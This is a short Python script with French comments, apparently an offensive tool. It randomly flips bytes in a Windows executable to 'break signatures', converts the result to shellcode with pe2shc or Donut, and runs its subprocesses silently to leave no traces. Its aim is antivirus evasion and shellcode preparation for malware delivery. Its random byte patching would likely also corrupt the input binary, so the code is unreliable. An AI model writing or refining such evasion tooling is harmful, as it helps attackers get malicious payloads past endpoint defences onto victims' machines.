#!/usr/bin/env python3
import sys, os, subprocess, tempfile, random

def x(p, silent=True):
    """Exécute un processus sans traces"""
    try:
        if silent:
            return subprocess.run(p, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return subprocess.run(p)
    except: return None

def m(b):
    """Modifications pour casser les signatures"""
    d = bytearray(b)
    for i in range(0, len(d), 64):
        if i + 4 < len(d):
            d[i+random.randint(0,3)] ^= random.randint(1,5)
    return d

def c(f_in, f_out=None):
    """Fonction principale"""
    if not f_out:
        f_out = f_in + ".bin"
    
    # Détection des outils disponibles avec vérification d'exécutabilité
    tools = []
    pe2shc_path = "pe2shc.exe" if os.name == "nt" else "./pe2shc"
    if os.path.exists(pe2shc_path) and os.access(pe2shc_path, os.X_OK): 
        tools.append("pe2shc")
    
    # Test Donut avec timeout pour éviter les blocages
    try:
        r = subprocess.run(["donut", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
        if r.returncode == 0:
            tools.append("donut")
    except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
        pass
    
    # Vérification d'au moins un outil disponible
    if not tools:
        return None
    
    # Sélection de méthode
    method = tools[0]  # Prendre le premier outil pour prévisibilité
    
    # Vérifier l'existence du fichier source
    if not os.path.isfile(f_in):
        return None
    
    # Patch binaire initial
    try:
        with open(f_in, 'rb') as f:
            data = m(f.read())
    except:
        return None
    
    # Fichier temporaire
    t = None
    try:
        # Utiliser mode binaire explicite
        t = tempfile.NamedTemporaryFile(delete=False, suffix=".exe", mode='wb')
        t.write(data)
        t.close()
        
        # Conversion selon méthode
        if method == "pe2shc":
            pe2shc = pe2shc_path
            x([pe2shc, t.name, f_out])
        elif method == "donut":
            x(["donut", "-f", "1", "-o", f_out, t.name])
    finally:
        # Nettoyage garanti
        if t and t.name and os.path.exists(t.name):
            try: os.unlink(t.name)
            except: pass
    
    # Vérification
    if os.path.exists(f_out):
        try:
            with open(f_out, 'rb') as f:
                return f.read()
        except:
            pass
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    f_in = sys.argv[1]
    f_out = sys.argv[2] if len(sys.argv) > 2 else None
    
    result = c(f_in, f_out)
    if not result:
        sys.exit(1)
    sys.exit(0)